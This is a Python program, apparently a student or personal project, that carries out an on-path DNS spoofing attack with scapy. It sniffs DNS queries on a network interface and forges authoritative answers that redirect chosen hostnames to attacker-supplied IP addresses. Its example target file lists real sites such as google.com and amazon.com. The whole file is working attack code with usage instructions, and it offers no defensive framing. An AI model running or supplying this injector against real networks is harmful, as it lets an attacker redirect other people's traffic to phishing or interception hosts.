"""
This program impliments a DNS injection spoofing attack on a specified set of hosts, on
a specified network interface. 
Author: Tim Johns
Last Modified: 12/12/24


Format for --hostnames.txt file:

BOF
0.0.0.0 example.com
0.0.0.0 testsite.org
0.0.0.0 google.com
0.0.0.0 amazon.com
0.0.0.0 facebook.com
0.0.0.0 microsoft.com
EOF

"""
import sys
import argparse
from scapy.all import sniff, sendp, IP, UDP, DNS, DNSQR, DNSRR
from scapy.utils import PcapWriter
from scapy.layers.l2 import Ether

def getTargets(file_path):
    """
    This function parses the host names from the file 
    and stores them in a target dictionary.
    """
    #This dictionary will contain the domain to IP mappings.
    targets = {}
    #Open the file:
    with open(file_path, 'r') as file:
        for line in file:
            #Create an array containing each half of the line:
            splitLine = line.split()
            #Store the mappings: {hostname : IP address}
            targets[splitLine[1]] = splitLine[0]
    return targets

def inspect_packet(packet, targets, pktdump):
    """
    This function is called each time a packet is detected while the program is sniffing.
    It takes that packet as a parameter, as well as the list of targets.
    """
    #Only forge and send a packet if the detected packet header is a DNS request header (qr = 0):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        #In scapy, packet[DNSQR] returns the dns question record layer section of the packet.
        dnsInfo = packet[DNSQR]
        #Grab the domain name that was being sought out. Then, decode it, get rid of the . that is added and 
        #make sure that it is all lowercase.
        domain_requested = dnsInfo.qname.decode('utf-8').strip('.').lower()

        #If the domain of the packet matches one of the targeted domains, launch the attack:
        if domain_requested in targets:
            print("------------------------------------------------------------")
            print(f"Intercepted DNS query for {domain_requested}")

           #Write the packet ot the pcap file:
            if packet.haslayer(Ether):
                pktdump.write(packet)
            elif packet.haslayer(IP):
                pktdump.write(packet[IP])


            #Begin crafting the forged DNS response:
            #Note: the /'s are scapy's way of building packets one layer at a time. 
            #Example: forged_response = IP_layer / UDP_layer / DNS_layer

            #Build IP layer using packet.dst as source and packet.src as destination
            ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)

            #Build UDP layer in the same way.
            udp_layer = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)

            #Now, in the DNS layer, insert the captured txid and desired forged IP address.
            #Also set the ttl to 300 and flag the packet as a response (qr=1).
            dns_layer = DNS(
                id=packet[DNS].id,     # Set the TXID to match the query
                qr=1,                  # Response (qr=1 means it's a response)
                aa=1,                  # Authoritative Answer
                rd=packet[DNS].rd,     # Recursion Desired (match the query)
                ra=1,                  # Recursion Available
                qd=packet[DNS].qd,     # Question section
                an=DNSRR(rrname=packet[DNSQR].qname, ttl=300, rdata=targets[domain_requested])
            )

            #Combine the layers to create the full packet. This uses Scapy's packet crafting syntax (ip/port/dns)
            #Note: I had to check if there was in ether layer to prevent the packets from being copied wierdly 
            #into the output pcap file 
            if packet.haslayer(Ether):
                eth_layer = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
                forged_response = eth_layer / ip_layer / udp_layer / dns_layer
            else:
                forged_response = ip_layer / udp_layer / dns_layer

            #Recalculate the checksum
            forged_response[UDP].chksum = None

            #Send the forged packet back to the source of the DNS query:
            sendp(forged_response, iface=interface, verbose=False)

            #Write the forged packet to the pcap file:
            pktdump.write(forged_response)

            print(f"Injected forged response: {domain_requested} ---> {targets[domain_requested]}")
            print("------------------------------------------------------------\n")

def main():

    #Parse the command-line arguments:
    parser = argparse.ArgumentParser(description="On-path DNS Injector")
    parser.add_argument('-i', '--interface', help="Network interface to listen on", required=True)
    parser.add_argument('--hostnames', help="File with hostnames to hijack", required=True)
    args = parser.parse_args()

    #Get the targets:
    targets = getTargets(args.hostnames)

    #Set the interface (global to it can be used elsewhere)
    global interface
    interface = args.interface

    #Display target mappings
    print("--------BEGINNING SESSION--------")
    print(f"\nListening on interface: {interface}")
    print("\nTargeting hostnames:\n")
    print("{:<30} {}".format("Domain", "Redirect to"))
    print("-" * 50)
    for domain, ip_addr in targets.items():
        print("{:<30} {}".format(domain, ip_addr))
    print("-" * 50)

    #Create a PcapWriter to write the captured packets to injection.pcap
    pktdump = PcapWriter("injection.pcap", append=True, sync=True)

    #Start the sniffing session:
    try:
        #Call the inspect_packet function on every packet sniffed. That will check the packet, and launch the attack if warranted:
        sniff(iface=interface, filter="udp port 53", prn=lambda pkt: inspect_packet(pkt, targets, pktdump), store=0)
    except KeyboardInterrupt:
        print("Exiting...")

if __name__ == '__main__':
    main()
